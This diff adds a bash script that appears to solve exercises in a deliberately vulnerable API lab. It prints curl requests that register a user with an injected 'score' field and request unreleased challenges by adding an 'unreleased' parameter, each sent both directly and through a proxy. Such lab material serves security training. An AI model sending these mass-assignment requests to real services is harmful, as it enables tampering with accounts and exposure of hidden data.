@@ -1,0 +1,38 @@
+#!/bin/bash
+
+. ../common
+
+cat<<xEOF
+
+browser: 
+  $proxy_root
+
+
+curl:
+
+0xa3:
+
+curl -s -X DELETE -H "authorization: Bearer $jwt" $root/api/user/john
+curl -v -X POST  -H 'content-type: application/json' --data-binary '{"username":"john","password":"doe","score":123456}' $root/api/register
+
+Validate Flag (optional):
+curl -v -X POST  -H 'content-type: application/json' --data-binary  '{"username":"john","password":"doe"}' $root/api/login 2>&1 | grep Authorization | awk '{print \$4}'
+curl -s -X GET -H "authorization: Bearer XXX" $root/api/scores
+
+
+
+curl -s -X DELETE -H "authorization: Bearer $jwt" $root/api/user/john
+curl -v -X POST  -H 'content-type: application/json' --data-binary '{"username":"john","password":"doe","score":123456}' $proxy_root/api/register
+
+
+
+0xa9:
+
+curl -s -H "authorization: Bearer $jwt"  -X POST -H 'content-type: application/json' --data-binary '{"unreleased": 1}' $root/api/allChallenges | jq
+
+curl -s -H "authorization: Bearer $jwt"  -X POST -H 'content-type: application/json' --data-binary '{"unreleased": 1}' $proxy_root/api/allChallenges
+
+
+xEOF
+
+haproxy_start
